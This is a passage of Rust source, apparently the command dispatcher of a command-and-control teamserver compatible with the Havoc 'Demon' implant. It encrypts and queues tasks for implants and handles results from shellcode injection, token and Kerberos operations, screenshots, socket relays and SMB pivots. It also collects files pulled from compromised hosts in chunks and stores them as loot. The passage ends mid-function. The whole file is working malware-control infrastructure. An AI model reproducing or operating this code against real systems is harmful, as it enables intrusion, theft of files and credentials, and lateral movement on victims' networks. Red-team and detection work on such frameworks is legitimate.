//! Command routing for parsed Demon callback packages.

use std::collections::BTreeMap;
use std::collections::HashMap;
use std::future::Future;
use std::pin::Pin;
use std::sync::Arc;

use base64::Engine as _;
use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
use red_cell_common::crypto::{AGENT_IV_LENGTH, AGENT_KEY_LENGTH, encrypt_agent_data};
use red_cell_common::demon::{
    DemonCallback, DemonCommand, DemonFilesystemCommand, DemonInjectError, DemonKerberosCommand,
    DemonMessage, DemonPackage, DemonProcessCommand, DemonProtocolError, DemonSocketCommand,
    DemonSocketType, DemonTokenCommand,
};
use red_cell_common::operator::{
    AgentEncryptionInfo as OperatorAgentEncryptionInfo, AgentInfo as OperatorAgentInfo,
    AgentPivotsInfo, AgentResponseInfo, AgentUpdateInfo, EventCode, Message, MessageHead,
    OperatorMessage,
};
use serde_json::Value;
use thiserror::Error;
use time::OffsetDateTime;
use time::format_description::well_known::Rfc3339;
use tokio::sync::RwLock;

use crate::{
    AgentRegistry, Database, DemonCallbackPackage, DemonPacketParser, EventBus, LootRecord,
    PivotInfo, SocketRelayManager, TeamserverError,
};

type HandlerFuture =
    Pin<Box<dyn Future<Output = Result<Option<Vec<u8>>, CommandDispatchError>> + Send>>;
type Handler = dyn Fn(u32, u32, Vec<u8>) -> HandlerFuture + Send + Sync + 'static;

#[derive(Clone, Debug, Default)]
struct DownloadTracker {
    inner: Arc<RwLock<HashMap<(u32, u32), DownloadState>>>,
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct DownloadState {
    request_id: u32,
    remote_path: String,
    expected_size: u64,
    data: Vec<u8>,
    started_at: String,
}

/// Error returned while routing or executing a Demon command handler.
#[derive(Debug, Error)]
pub enum CommandDispatchError {
    /// The dispatcher could not update shared teamserver state.
    #[error("{0}")]
    Registry(#[from] TeamserverError),
    /// A handler failed to serialize its response in Havoc's package format.
    #[error("failed to serialize demon response: {0}")]
    Protocol(#[from] DemonProtocolError),
    /// The dispatcher could not format a callback timestamp.
    #[error("failed to format callback timestamp: {0}")]
    Timestamp(#[from] time::error::Format),
    /// Stored AES material is invalid.
    #[error("invalid base64 in stored {field} for agent 0x{agent_id:08X}: {message}")]
    InvalidStoredCryptoEncoding {
        /// Agent identifier associated with the invalid value.
        agent_id: u32,
        /// Stored field name.
        field: &'static str,
        /// Decoder error message.
        message: String,
    },
    /// Stored AES material decoded to an unexpected length.
    #[error("stored {field} for agent 0x{agent_id:08X} has {actual} bytes, expected {expected}")]
    InvalidStoredCryptoLength {
        /// Agent identifier associated with the invalid value.
        agent_id: u32,
        /// Stored field name.
        field: &'static str,
        /// Required decoded length.
        expected: usize,
        /// Observed decoded length.
        actual: usize,
    },
    /// A callback payload could not be parsed according to the Havoc wire format.
    #[error("failed to parse callback payload for command 0x{command_id:08X}: {message}")]
    InvalidCallbackPayload {
        /// Raw command identifier associated with the callback.
        command_id: u32,
        /// Human-readable parser error.
        message: String,
    },
}

/// Central registry of Demon command handlers keyed by command identifier.
#[derive(Clone)]
pub struct CommandDispatcher {
    handlers: Arc<HashMap<u32, Arc<Handler>>>,
}

impl std::fmt::Debug for CommandDispatcher {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let mut commands = self.handlers.keys().copied().collect::<Vec<_>>();
        commands.sort_unstable();
        formatter.debug_struct("CommandDispatcher").field("registered_commands", &commands).finish()
    }
}

impl Default for CommandDispatcher {
    fn default() -> Self {
        Self::new()
    }
}

impl CommandDispatcher {
    /// Create an empty dispatcher with no registered handlers.
    #[must_use]
    pub fn new() -> Self {
        Self { handlers: Arc::new(HashMap::new()) }
    }

    /// Create a dispatcher with the built-in Demon command handlers.
    #[must_use]
    pub fn with_builtin_handlers(
        registry: AgentRegistry,
        events: EventBus,
        database: Database,
        sockets: SocketRelayManager,
    ) -> Self {
        let mut dispatcher = Self::new();
        let downloads = DownloadTracker::default();

        let get_job_registry = registry.clone();
        dispatcher.register_handler(
            u32::from(DemonCommand::CommandGetJob),
            move |agent_id, _, _| {
                let registry = get_job_registry.clone();
                Box::pin(async move { handle_get_job(&registry, agent_id).await })
            },
        );

        let checkin_registry = registry.clone();
        let checkin_events = events.clone();
        dispatcher.register_handler(
            u32::from(DemonCommand::CommandCheckin),
            move |agent_id, _, _| {
                let registry = checkin_registry.clone();
                let events = checkin_events.clone();
                Box::pin(async move { handle_checkin(&registry, &events, agent_id).await })
            },
        );

        let proc_list_events = events.clone();
        dispatcher.register_handler(
            u32::from(DemonCommand::CommandProcList),
            move |agent_id, request_id, payload| {
                let events = proc_list_events.clone();
                Box::pin(async move {
                    handle_process_list_callback(&events, agent_id, request_id, &payload).await
                })
            },
        );

        let fs_database = database.clone();
        let fs_events = events.clone();
        let fs_downloads = downloads.clone();
        dispatcher.register_handler(
            u32::from(DemonCommand::CommandFs),
            move |agent_id, request_id, payload| {
                let database = fs_database.clone();
                let events = fs_events.clone();
                let downloads = fs_downloads.clone();
                Box::pin(async move {
                    handle_filesystem_callback(
                        &database, &events, &downloads, agent_id, request_id, &payload,
                    )
                    .await
                })
            },
        );

        let proc_events = events.clone();
        dispatcher.register_handler(
            u32::from(DemonCommand::CommandProc),
            move |agent_id, request_id, payload| {
                let events = proc_events.clone();
                Box::pin(async move {
                    handle_process_command_callback(&events, agent_id, request_id, &payload).await
                })
            },
        );

        let inject_events = events.clone();
        dispatcher.register_handler(
            u32::from(DemonCommand::CommandInjectShellcode),
            move |agent_id, request_id, payload| {
                let events = inject_events.clone();
                Box::pin(async move {
                    handle_inject_shellcode_callback(&events, agent_id, request_id, &payload).await
                })
            },
        );

        let command_output_events = events.clone();
        dispatcher.register_handler(
            u32::from(DemonCommand::CommandOutput),
            move |agent_id, request_id, payload| {
                let events = command_output_events.clone();
                Box::pin(async move {
                    handle_command_output_callback(&events, agent_id, request_id, &payload).await
                })
            },
        );

        let beacon_database = database.clone();
        let beacon_events = events.clone();
        let beacon_downloads = downloads.clone();
        dispatcher.register_handler(
            u32::from(DemonCommand::BeaconOutput),
            move |agent_id, request_id, payload| {
                let database = beacon_database.clone();
                let events = beacon_events.clone();
                let downloads = beacon_downloads.clone();
                Box::pin(async move {
                    handle_beacon_output_callback(
                        &database, &events, &downloads, agent_id, request_id, &payload,
                    )
                    .await
                })
            },
        );

        let token_events = events.clone();
        dispatcher.register_handler(
            u32::from(DemonCommand::CommandToken),
            move |agent_id, request_id, payload| {
                let events = token_events.clone();
                Box::pin(async move {
                    handle_token_callback(&events, agent_id, request_id, &payload).await
                })
            },
        );

        let screenshot_database = database.clone();
        let screenshot_events = events.clone();
        dispatcher.register_handler(
            u32::from(DemonCommand::CommandScreenshot),
            move |agent_id, request_id, payload| {
                let database = screenshot_database.clone();
                let events = screenshot_events.clone();
                Box::pin(async move {
                    handle_screenshot_callback(&database, &events, agent_id, request_id, &payload)
                        .await
                })
            },
        );

        let kerberos_events = events.clone();
        dispatcher.register_handler(
            u32::from(DemonCommand::CommandKerberos),
            move |agent_id, request_id, payload| {
                let events = kerberos_events.clone();
                Box::pin(async move {
                    handle_kerberos_callback(&events, agent_id, request_id, &payload).await
                })
            },
        );

        let socket_events = events.clone();
        let socket_manager = sockets.clone();
        dispatcher.register_handler(
            u32::from(DemonCommand::CommandSocket),
            move |agent_id, request_id, payload| {
                let events = socket_events.clone();
                let sockets = socket_manager.clone();
                Box::pin(async move {
                    handle_socket_callback(&events, &sockets, agent_id, request_id, &payload).await
                })
            },
        );

        let pivot_registry = registry.clone();
        let pivot_events = events.clone();
        let pivot_database = database.clone();
        let pivot_sockets = sockets.clone();
        dispatcher.register_handler(
            u32::from(DemonCommand::CommandPivot),
            move |agent_id, request_id, payload| {
                let registry = pivot_registry.clone();
                let events = pivot_events.clone();
                let database = pivot_database.clone();
                let sockets = pivot_sockets.clone();
                Box::pin(async move {
                    handle_pivot_callback(
                        &registry, &events, &database, &sockets, agent_id, request_id, &payload,
                    )
                    .await
                })
            },
        );

        dispatcher
    }

    /// Register or replace a handler for a raw Demon command identifier.
    pub fn register_handler<F>(&mut self, command_id: u32, handler: F)
    where
        F: Fn(u32, u32, Vec<u8>) -> HandlerFuture + Send + Sync + 'static,
    {
        Arc::make_mut(&mut self.handlers).insert(command_id, Arc::new(handler));
    }

    /// Return `true` when a handler is registered for `command_id`.
    #[must_use]
    pub fn handles_command(&self, command_id: u32) -> bool {
        self.handlers.contains_key(&command_id)
    }

    /// Dispatch a single parsed callback package.
    pub async fn dispatch(
        &self,
        agent_id: u32,
        command_id: u32,
        request_id: u32,
        payload: &[u8],
    ) -> Result<Option<Vec<u8>>, CommandDispatchError> {
        let Some(handler) = self.handlers.get(&command_id).cloned() else {
            return Ok(None);
        };

        handler(agent_id, request_id, payload.to_vec()).await
    }

    /// Dispatch multiple parsed callback packages and concatenate any response packages.
    pub async fn dispatch_packages(
        &self,
        agent_id: u32,
        packages: &[DemonCallbackPackage],
    ) -> Result<Vec<u8>, CommandDispatchError> {
        let mut response = Vec::new();

        for package in packages {
            if let Some(bytes) = self
                .dispatch(agent_id, package.command_id, package.request_id, &package.payload)
                .await?
            {
                response.extend_from_slice(&bytes);
            }
        }

        Ok(response)
    }
}

async fn handle_get_job(
    registry: &AgentRegistry,
    agent_id: u32,
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let jobs = registry.dequeue_jobs(agent_id).await?;
    if jobs.is_empty() {
        return Ok(None);
    }

    let encryption = registry.encryption(agent_id).await?;
    let key = decode_fixed::<AGENT_KEY_LENGTH>(agent_id, "aes_key", encryption.aes_key.as_bytes())?;
    let iv = decode_fixed::<AGENT_IV_LENGTH>(agent_id, "aes_iv", encryption.aes_iv.as_bytes())?;
    let mut packages = Vec::with_capacity(jobs.len());

    for job in jobs {
        let payload = if job.payload.is_empty() {
            Vec::new()
        } else {
            encrypt_agent_data(&key, &iv, &job.payload)
        };
        packages.push(DemonPackage {
            command_id: job.command,
            request_id: job.request_id,
            payload,
        });
    }

    Ok(Some(DemonMessage::new(packages).to_bytes()?))
}

async fn handle_checkin(
    registry: &AgentRegistry,
    events: &EventBus,
    agent_id: u32,
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let timestamp = OffsetDateTime::now_utc().format(&Rfc3339)?;
    let agent = registry.set_last_call_in(agent_id, timestamp).await?;
    events.broadcast(agent_update_event(&agent));
    Ok(None)
}

async fn handle_pivot_callback(
    registry: &AgentRegistry,
    events: &EventBus,
    database: &Database,
    sockets: &SocketRelayManager,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandPivot));
    let subcommand = parser.read_u32("pivot subcommand")?;

    match subcommand.try_into() {
        Ok(red_cell_common::demon::DemonPivotCommand::SmbConnect) => {
            handle_pivot_connect_callback(registry, events, agent_id, request_id, &mut parser).await
        }
        Ok(red_cell_common::demon::DemonPivotCommand::SmbDisconnect) => {
            handle_pivot_disconnect_callback(registry, events, agent_id, request_id, &mut parser)
                .await
        }
        Ok(red_cell_common::demon::DemonPivotCommand::SmbCommand) => {
            handle_pivot_command_callback(
                registry,
                events,
                database,
                sockets,
                agent_id,
                &mut parser,
            )
            .await
        }
        Ok(red_cell_common::demon::DemonPivotCommand::List) => Ok(None),
        Err(error) => Err(CommandDispatchError::InvalidCallbackPayload {
            command_id: u32::from(DemonCommand::CommandPivot),
            message: error.to_string(),
        }),
    }
}

async fn handle_pivot_connect_callback(
    registry: &AgentRegistry,
    events: &EventBus,
    parent_agent_id: u32,
    request_id: u32,
    parser: &mut CallbackParser<'_>,
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let success = parser.read_u32("pivot connect success")?;
    if success == 0 {
        return Ok(None);
    }

    let inner = parser.read_bytes("pivot connect inner demon init")?;
    let child_agent_id = inner_demon_agent_id(&inner).map_err(|error| {
        CommandDispatchError::InvalidCallbackPayload {
            command_id: u32::from(DemonCommand::CommandPivot),
            message: error.to_string(),
        }
    })?;
    let existed = registry.get(child_agent_id).await.is_some();
    let external_ip =
        registry.get(parent_agent_id).await.map(|agent| agent.external_ip).unwrap_or_default();
    let parsed = DemonPacketParser::new(registry.clone()).parse(&inner, external_ip).await;
    let child_agent = match parsed {
        Ok(crate::ParsedDemonPacket::Init(init)) => init.agent,
        Ok(_) => {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: u32::from(DemonCommand::CommandPivot),
                message: "pivot connect payload did not contain a demon init envelope".to_owned(),
            });
        }
        Err(error) => {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: u32::from(DemonCommand::CommandPivot),
                message: error.to_string(),
            });
        }
    };

    registry.add_link(parent_agent_id, child_agent.agent_id).await?;
    let pivots = registry.pivots(child_agent.agent_id).await;
    if existed {
        events.broadcast(agent_update_event(&child_agent));
    } else {
        events.broadcast(agent_new_event(
            "smb",
            red_cell_common::demon::DEMON_MAGIC_VALUE,
            &child_agent,
            &pivots,
        ));
    }
    events.broadcast(agent_response_event(
        parent_agent_id,
        u32::from(DemonCommand::CommandPivot),
        request_id,
        "Good",
        &format!(
            "[SMB] Connected to pivot agent [{parent_agent_id:08X}]-<>-<>-[{}]",
            child_agent.name_id()
        ),
        None,
    )?);
    Ok(None)
}

async fn handle_pivot_disconnect_callback(
    registry: &AgentRegistry,
    events: &EventBus,
    parent_agent_id: u32,
    request_id: u32,
    parser: &mut CallbackParser<'_>,
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let success = parser.read_u32("pivot disconnect success")?;
    let child_agent_id = parser.read_u32("pivot disconnect child agent id")?;
    if success == 0 {
        return Ok(None);
    }

    let affected =
        registry.disconnect_link(parent_agent_id, child_agent_id, "Disconnected").await?;
    for agent_id in affected {
        if let Some(agent) = registry.get(agent_id).await {
            events.broadcast(agent_update_event(&agent));
        }
    }
    events.broadcast(agent_response_event(
        parent_agent_id,
        u32::from(DemonCommand::CommandPivot),
        request_id,
        "Info",
        &format!("[SMB] Agent disconnected {child_agent_id:08X}"),
        None,
    )?);
    Ok(None)
}

async fn handle_pivot_command_callback(
    registry: &AgentRegistry,
    events: &EventBus,
    database: &Database,
    sockets: &SocketRelayManager,
    _parent_agent_id: u32,
    parser: &mut CallbackParser<'_>,
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let package = parser.read_bytes("pivot command package")?;
    let parsed = DemonPacketParser::new(registry.clone()).parse(&package, String::new()).await;
    let (child_agent_id, packages) = match parsed {
        Ok(crate::ParsedDemonPacket::Callback { header, packages }) => (header.agent_id, packages),
        Ok(_) => {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: u32::from(DemonCommand::CommandPivot),
                message: "pivot command payload did not contain a callback envelope".to_owned(),
            });
        }
        Err(error) => {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: u32::from(DemonCommand::CommandPivot),
                message: error.to_string(),
            });
        }
    };

    let timestamp = OffsetDateTime::now_utc().format(&Rfc3339)?;
    let updated = registry.set_last_call_in(child_agent_id, timestamp).await?;
    events.broadcast(agent_update_event(&updated));
    dispatch_builtin_packages(registry, events, database, sockets, child_agent_id, &packages).await
}

async fn dispatch_builtin_packages(
    registry: &AgentRegistry,
    events: &EventBus,
    database: &Database,
    sockets: &SocketRelayManager,
    agent_id: u32,
    packages: &[DemonCallbackPackage],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut response = None;

    for package in packages {
        let next = dispatch_builtin_package(
            registry,
            events,
            database,
            sockets,
            agent_id,
            package.command_id,
            package.request_id,
            &package.payload,
        )
        .await?;
        if next.is_some() {
            response = next;
        }
    }

    Ok(response)
}

async fn dispatch_builtin_package(
    registry: &AgentRegistry,
    events: &EventBus,
    database: &Database,
    sockets: &SocketRelayManager,
    agent_id: u32,
    command_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let downloads = DownloadTracker::default();
    if command_id == u32::from(DemonCommand::CommandGetJob) {
        return Ok(None);
    }
    if command_id == u32::from(DemonCommand::CommandCheckin) {
        return handle_checkin(registry, events, agent_id).await;
    }
    if command_id == u32::from(DemonCommand::CommandFs) {
        return handle_filesystem_callback(
            database, events, &downloads, agent_id, request_id, payload,
        )
        .await;
    }
    if command_id == u32::from(DemonCommand::CommandProcList) {
        return handle_process_list_callback(events, agent_id, request_id, payload).await;
    }
    if command_id == u32::from(DemonCommand::CommandProc) {
        return handle_process_command_callback(events, agent_id, request_id, payload).await;
    }
    if command_id == u32::from(DemonCommand::CommandOutput) {
        return handle_command_output_callback(events, agent_id, request_id, payload).await;
    }
    if command_id == u32::from(DemonCommand::BeaconOutput) {
        return handle_beacon_output_callback(
            database, events, &downloads, agent_id, request_id, payload,
        )
        .await;
    }
    if command_id == u32::from(DemonCommand::CommandInjectShellcode) {
        return handle_inject_shellcode_callback(events, agent_id, request_id, payload).await;
    }
    if command_id == u32::from(DemonCommand::CommandToken) {
        return handle_token_callback(events, agent_id, request_id, payload).await;
    }
    if command_id == u32::from(DemonCommand::CommandScreenshot) {
        return handle_screenshot_callback(database, events, agent_id, request_id, payload).await;
    }
    if command_id == u32::from(DemonCommand::CommandKerberos) {
        return handle_kerberos_callback(events, agent_id, request_id, payload).await;
    }
    if command_id == u32::from(DemonCommand::CommandSocket) {
        return handle_socket_callback(events, sockets, agent_id, request_id, payload).await;
    }
    if command_id == u32::from(DemonCommand::CommandPivot) {
        return Box::pin(handle_pivot_callback(
            registry, events, database, sockets, agent_id, request_id, payload,
        ))
        .await;
    }
    Ok(None)
}

fn inner_demon_agent_id(bytes: &[u8]) -> Result<u32, DemonProtocolError> {
    Ok(red_cell_common::demon::DemonEnvelope::from_bytes(bytes)?.header.agent_id)
}

impl DownloadTracker {
    async fn start(&self, agent_id: u32, file_id: u32, state: DownloadState) {
        self.inner.write().await.insert((agent_id, file_id), state);
    }

    async fn append(
        &self,
        agent_id: u32,
        file_id: u32,
        chunk: &[u8],
    ) -> Result<DownloadState, CommandDispatchError> {
        let mut state = self.inner.write().await;
        let Some(download) = state.get_mut(&(agent_id, file_id)) else {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: u32::from(DemonCommand::BeaconOutput),
                message: format!("download 0x{file_id:08X} was not opened"),
            });
        };
        download.data.extend_from_slice(chunk);
        Ok(download.clone())
    }

    async fn finish(&self, agent_id: u32, file_id: u32) -> Option<DownloadState> {
        self.inner.write().await.remove(&(agent_id, file_id))
    }
}

async fn handle_command_output_callback(
    events: &EventBus,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandOutput));
    let output = parser.read_string("command output text")?;
    if output.is_empty() {
        return Ok(None);
    }

    events.broadcast(agent_response_event(
        agent_id,
        u32::from(DemonCommand::CommandOutput),
        request_id,
        "Good",
        &format!("Received Output [{} bytes]:", output.len()),
        Some(output),
    )?);
    Ok(None)
}

async fn handle_beacon_output_callback(
    database: &Database,
    events: &EventBus,
    downloads: &DownloadTracker,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::BeaconOutput));
    let callback = parser.read_u32("beacon callback type")?;

    match DemonCallback::try_from(callback).map_err(|error| {
        CommandDispatchError::InvalidCallbackPayload {
            command_id: u32::from(DemonCommand::BeaconOutput),
            message: error.to_string(),
        }
    })? {
        DemonCallback::Output => {
            let output = parser.read_string("beacon output text")?;
            if !output.is_empty() {
                events.broadcast(agent_response_event(
                    agent_id,
                    u32::from(DemonCommand::BeaconOutput),
                    request_id,
                    "Good",
                    &format!("Received Output [{} bytes]:", output.len()),
                    Some(output),
                )?);
            }
        }
        DemonCallback::OutputOem | DemonCallback::OutputUtf8 => {
            let output = parser.read_utf16("beacon output utf16")?;
            if !output.is_empty() {
                events.broadcast(agent_response_event(
                    agent_id,
                    u32::from(DemonCommand::BeaconOutput),
                    request_id,
                    "Good",
                    &format!("Received Output [{} bytes]:", output.len()),
                    Some(output),
                )?);
            }
        }
        DemonCallback::ErrorMessage => {
            let output = parser.read_string("beacon error text")?;
            if !output.is_empty() {
                events.broadcast(agent_response_event(
                    agent_id,
                    u32::from(DemonCommand::BeaconOutput),
                    request_id,
                    "Error",
                    &format!("Received Output [{} bytes]:", output.len()),
                    Some(output),
                )?);
            }
        }
        DemonCallback::File => {
            let bytes = parser.read_bytes("beacon file open")?;
            let (file_id, expected_size, remote_path) =
                parse_file_open_header(u32::from(DemonCommand::BeaconOutput), &bytes)?;
            let started_at = OffsetDateTime::now_utc().format(&Rfc3339)?;
            downloads
                .start(
                    agent_id,
                    file_id,
                    DownloadState {
                        request_id,
                        remote_path: remote_path.clone(),
                        expected_size,
                        data: Vec::new(),
                        started_at,
                    },
                )
                .await;
            events.broadcast(download_progress_event(
                agent_id,
                u32::from(DemonCommand::BeaconOutput),
                request_id,
                file_id,
                &remote_path,
                0,
                expected_size,
                "Started",
            )?);
        }
        DemonCallback::FileWrite => {
            let bytes = parser.read_bytes("beacon file write")?;
            let (file_id, chunk) = parse_file_chunk(u32::from(DemonCommand::BeaconOutput), &bytes)?;
            let state = downloads.append(agent_id, file_id, &chunk).await?;
            events.broadcast(download_progress_event(
                agent_id,
                u32::from(DemonCommand::BeaconOutput),
                state.request_id,
                file_id,
                &state.remote_path,
                u64::try_from(state.data.len()).unwrap_or_default(),
                state.expected_size,
                "InProgress",
            )?);
        }
        DemonCallback::FileClose => {
            let bytes = parser.read_bytes("beacon file close")?;
            let file_id = parse_file_close(u32::from(DemonCommand::BeaconOutput), &bytes)?;
            if let Some(state) = downloads.finish(agent_id, file_id).await {
                persist_download(database, agent_id, file_id, &state).await?;
                events.broadcast(download_complete_event(
                    agent_id,
                    u32::from(DemonCommand::BeaconOutput),
                    state.request_id,
                    file_id,
                    &state,
                )?);
            }
        }
    }

    Ok(None)
}

async fn handle_filesystem_callback(
    database: &Database,
    events: &EventBus,
    downloads: &DownloadTracker,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandFs));
    let subcommand = parser.read_u32("filesystem subcommand")?;
    let subcommand = DemonFilesystemCommand::try_from(subcommand).map_err(|error| {
        CommandDispatchError::InvalidCallbackPayload {
            command_id: u32::from(DemonCommand::CommandFs),
            message: error.to_string(),
        }
    })?;
    match subcommand {
        DemonFilesystemCommand::Dir => {
            let explorer = parser.read_bool("filesystem dir explorer")?;
            let list_only = parser.read_bool("filesystem dir list only")?;
            let root_path = parser.read_utf16("filesystem dir root path")?;
            let success = parser.read_bool("filesystem dir success")?;
            let mut lines = Vec::new();
            let mut explorer_rows = Vec::new();

            if success {
                while !parser.is_empty() {
                    let path = parser.read_utf16("filesystem dir path")?;
                    let file_count = parser.read_u32("filesystem dir file count")?;
                    let dir_count = parser.read_u32("filesystem dir dir count")?;
                    let total_size = if list_only {
                        None
                    } else {
                        Some(parser.read_u64("filesystem dir total size")?)
                    };

                    if !explorer {
                        lines.push(format!(" Directory of {path}"));
                        lines.push(String::new());
                    }

                    let item_count = file_count + dir_count;
                    for _ in 0..item_count {
                        let name = parser.read_utf16("filesystem dir item name")?;
                        if list_only {
                            lines.push(format!("{}{}", path.trim_end_matches('*'), name));
                            continue;
                        }
                        let is_dir = parser.read_bool("filesystem dir item is dir")?;
                        let size = parser.read_u64("filesystem dir item size")?;
                        let day = parser.read_u32("filesystem dir item day")?;
                        let month = parser.read_u32("filesystem dir item month")?;
                        let year = parser.read_u32("filesystem dir item year")?;
                        let minute = parser.read_u32("filesystem dir item minute")?;
                        let hour = parser.read_u32("filesystem dir item hour")?;
                        let modified = format!("{day:02}/{month:02}/{year}  {hour:02}:{minute:02}");
                        if explorer {
                            explorer_rows.push(Value::Object(
                                [
                                    (
                                        "Type".to_owned(),
                                        Value::String(if is_dir { "dir" } else { "" }.to_owned()),
                                    ),
                                    (
                                        "Size".to_owned(),
                                        Value::String(if is_dir {
                                            String::new()
                                        } else {
                                            byte_count(size)
                                        }),
                                    ),
                                    ("Modified".to_owned(), Value::String(modified)),
                                    ("Name".to_owned(), Value::String(name)),
                                ]
                                .into_iter()
                                .collect(),
                            ));
                        } else {
                            let dir_text = if is_dir { "<DIR>" } else { "" };
                            let size_text = if is_dir { String::new() } else { byte_count(size) };
                            lines.push(format!(
                                "{modified:<17}    {dir_text:<5}  {size_text:<12}   {name}"
                            ));
                        }
                    }

                    if !explorer && !list_only && (file_count > 0 || dir_count > 0) {
                        lines.push(format!(
                            "               {file_count} File(s)     {}",
                            byte_count(total_size.unwrap_or_default())
                        ));
                        lines.push(format!("               {dir_count} Folder(s)"));
                        lines.push(String::new());
                    }
                }
            }

            let output = if lines.is_empty() {
                "No file or folder was found".to_owned()
            } else {
                lines.join("\n").trim().to_owned()
            };
            let mut extra = BTreeMap::new();
            if explorer {
                extra.insert("MiscType".to_owned(), Value::String("FileExplorer".to_owned()));
                extra.insert(
                    "MiscData".to_owned(),
                    Value::String(
                        BASE64_STANDARD.encode(
                            serde_json::to_vec(&Value::Object(
                                [
                                    ("Path".to_owned(), Value::String(root_path)),
                                    ("Files".to_owned(), Value::Array(explorer_rows)),
                                ]
                                .into_iter()
                                .collect(),
                            ))
                            .map_err(|error| {
                                CommandDispatchError::InvalidCallbackPayload {
                                    command_id: u32::from(DemonCommand::CommandFs),
                                    message: error.to_string(),
                                }
                            })?,
                        ),
                    ),
                );
            }
            events.broadcast(agent_response_event_with_extra(
                agent_id,
                u32::from(DemonCommand::CommandFs),
                request_id,
                "Info",
                if output == "No file or folder was found" {
                    "No file or folder was found"
                } else {
                    "Directory listing completed"
                },
                extra,
                output,
            )?);
        }
        DemonFilesystemCommand::Download => {
            let mode = parser.read_u32("filesystem download mode")?;
            let file_id = parser.read_u32("filesystem download file id")?;
            match mode {
                0 => {
                    let expected_size = parser.read_u64("filesystem download size")?;
                    let remote_path = parser.read_utf16("filesystem download path")?;
                    let started_at = OffsetDateTime::now_utc().format(&Rfc3339)?;
                    downloads
                        .start(
                            agent_id,
                            file_id,
                            DownloadState {
                                request_id,
                                remote_path: remote_path.clone(),
                                expected_size,
                                data: Vec::new(),
                                started_at,
                            },
                        )
                        .await;
                    events.broadcast(download_progress_event(
                        agent_id,
                        u32::from(DemonCommand::CommandFs),
                        request_id,
                        file_id,
                        &remote_path,
                        0,
                        expected_size,
                        "Started",
                    )?);
                }
                1 => {
                    let chunk = parser.read_bytes("filesystem download chunk")?;
                    let state = downloads.append(agent_id, file_id, &chunk).await?;
                    events.broadcast(download_progress_event(
                        agent_id,
                        u32::from(DemonCommand::CommandFs),
                        state.request_id,
                        file_id,
                        &state.remote_path,
                        u64::try_from(state.data.len()).unwrap_or_default(),
                        state.expected_size,
                        "InProgress",
                    )?);
                }
                2 => {
                    let reason = parser.read_u32("filesystem download close reason")?;
                    if let Some(state) = downloads.finish(agent_id, file_id).await {
                        if reason == 0 {
                            persist_download(database, agent_id, file_id, &state).await?;
                            events.broadcast(download_complete_event(
                                agent_id,
                                u32::from(DemonCommand::CommandFs),
                                state.request_id,
                                file_id,
                                &state,
                            )?);
                        } else {
                            events.broadcast(download_progress_event(
                                agent_id,
                                u32::from(DemonCommand::CommandFs),
                                state.request_id,
                                file_id,
                                &state.remote_path,
                                u64::try_from(state.data.len()).unwrap_or_default(),
                                state.expected_size,
                                "Removed",
                            )?);
                        }
                    }
                }
                other => {
                    return Err(CommandDispatchError::InvalidCallbackPayload {
                        command_id: u32::from(DemonCommand::CommandFs),
                        message: format!("unsupported filesystem download mode {other}"),
                    });
                }
            }
        }
        DemonFilesystemCommand::Upload => {
            let size = parser.read_u32("filesystem upload size")?;
            let path = parser.read_utf16("filesystem upload path")?;
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandFs),
                request_id,
                "Info",
                &format!("Uploaded file: {path} ({size} bytes)"),
                None,
            )?);
        }
        DemonFilesystemCommand::Cd => {
            let path = parser.read_utf16("filesystem cd path")?;
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandFs),
                request_id,
                "Info",
                &format!("Changed directory: {path}"),
                None,
            )?);
        }
        DemonFilesystemCommand::Remove => {
            let is_dir = parser.read_bool("filesystem remove is dir")?;
            let path = parser.read_utf16("filesystem remove path")?;
            let noun = if is_dir { "directory" } else { "file" };
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandFs),
                request_id,
                "Info",
                &format!("Removed {noun}: {path}"),
                None,
            )?);
        }
        DemonFilesystemCommand::Mkdir => {
            let path = parser.read_utf16("filesystem mkdir path")?;
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandFs),
                request_id,
                "Info",
                &format!("Created directory: {path}"),
                None,
            )?);
        }
        DemonFilesystemCommand::Copy | DemonFilesystemCommand::Move => {
            let success = parser.read_bool("filesystem copy/move success")?;
            let from = parser.read_utf16("filesystem copy/move from")?;
            let to = parser.read_utf16("filesystem copy/move to")?;
            let verb =
                if matches!(subcommand, DemonFilesystemCommand::Copy) { "copied" } else { "moved" };
            let kind = if success { "Good" } else { "Error" };
            let message = if success {
                format!("Successfully {verb} file {from} to {to}")
            } else {
                format!("Failed to {verb} file {from} to {to}")
            };
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandFs),
                request_id,
                kind,
                &message,
                None,
            )?);
        }
        DemonFilesystemCommand::GetPwd => {
            let path = parser.read_utf16("filesystem pwd path")?;
            events.broadcast(agent_response_event(
                agent_id,
